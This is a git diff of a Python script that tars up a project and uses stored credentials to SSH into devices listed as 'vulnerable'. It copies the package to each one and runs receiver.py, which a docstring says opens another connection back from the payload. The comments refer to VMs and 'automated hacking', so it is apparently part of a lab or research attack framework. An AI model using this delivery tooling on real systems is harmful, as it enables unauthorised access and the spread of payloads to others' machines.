@@ -5,15 +5,10 @@
 """
 import sys, os, tarfile, time, pexpect, json
 from pathlib import Path
-"""
-This method may be necessary to some degree if there are issues 
-with permissions, but for nwo it's not necessary.
-"""
-def set_info(tarinfo):
-    tarinfo.uid = tarinfo.gid = 0
-    tarinfo.mode = 755
-    tarinfo.uname = tarinfo.gname = "root"
-    return tarinfo
+from pexpect import pxssh
+
+class sshException(Exception):
+    """Unable to establish connection to machine."""
 
 """
 We only want to send what is necessary for the computer to do what
@@ -25,43 +20,40 @@ def construct_package():
     compressed tar file. The if simply checks if the tar exists and 
     needs to be replaced."""
     tar_file =  os.path.isfile("../prf.tar.gz")
-    #boidfunc_path = os.path.abspath("../boidfunc")
-    #resources_path = os.path.abspath("../resources")
-    #silla_path = os.path.abspath("../silla")
     if tar_file:
         os.remove("../prf.tar.gz")
         with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
-            tar.add("../boidfunc", arcname = "boidfunc", filter=set_info)
-            tar.add("../resources", arcname = "resources", filter=set_info)
-            tar.add("../silla", arcname = "silla", filter=set_info)
+            tar.add("../boidfunc", arcname = "boidfunc")
+            tar.add("../resources", arcname = "resources")
+            tar.add("../silla", arcname = "silla")
     else:
         with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
-            tar.add("../boidfunc", arcname = "boidfunc", filter=set_info)
-            tar.add("../resources", arcname = "resources", filter=set_info)
-            tar.add("../silla", arcname = "silla", filter=set_info)
+            tar.add("../boidfunc", arcname = "boidfunc")
+            tar.add("../resources", arcname = "resources")
+            tar.add("../silla", arcname = "silla")
     
     #Move the tar file up one level.
     p = Path("./prf.tar.gz").absolute()
     parent_dir = p.parents[1]
     p.rename(parent_dir / p.name)
 
-def ssh_connect(user, ip, port, password):
+def ssh_connect(user, ip, dport, password):
     """
     Spawns a pexpect object which in this case is the connection to 
     the VM. The object ssh's into the VM, waits for the password 
     prompt, and passes the password.
     
-    This will have to dynamically load passwords and api's and stuff, 
-    and assuming there ever is automated hacking there may be 
-    some redundancy.
+    After succesful login, receiver.py is executed, the ssh is exited, and the
+    object gets closed.
     """
-    ssh = pexpect.spawn(
-        "ssh {}@{} -p {}".format(user, ip, port), 
-        timeout=None
-    )
-    #ssh.logfile = sys.stdout.buffer
-    ssh.expect("password: ", timeout=120)
-    ssh.sendline(password)
+    try:
+        #Uncomment and move between lines to see output/debug
+        #ssh.prompt()
+        #print (ssh.before)
+        ssh = pxssh.pxssh()
+        ssh.login(ip, user, password, port = dport)
+    except pxssh.ExceptionPxssh as e:
+        raise sshException(e)
     return ssh
 
 def deliver_package(user, ip, port, password):
@@ -101,12 +93,13 @@ def deliver_package(user, ip, port, password):
 def initiate(ssh):
     """Start receiver.py which should initiate another connection 
     from within boidload."""
-    ssh.sendline("python3 reciever.py")
+    ssh.sendline("./receiver.py")
     return ssh
 
 def disconnect(ssh):
     ssh.sendline("exit")
-    ssh.close()
+    ssh.logout()
+    return
 
 def main():
     print ("construct_package")
@@ -115,13 +108,17 @@ def main():
     with open("../resources/index.json") as json_file:
         data = json.load(json_file)
         for device, info in data["vulnerable"].items():
-            print ("ssh_connect")
-            ssh = ssh_connect(
-                info["username"], 
-                info["ip_addr"], 
-                info["port"], 
-                info["password"]
-            )
+            try:
+                print ("\nssh_connect")
+                ssh = ssh_connect(
+                    info["username"], 
+                    info["ip_addr"], 
+                    info["port"], 
+                    info["password"]
+                )
+            except sshException as e:
+                print (e)
+                continue
             print ("deliver_package")
             deliver_package(
                 info["username"], 
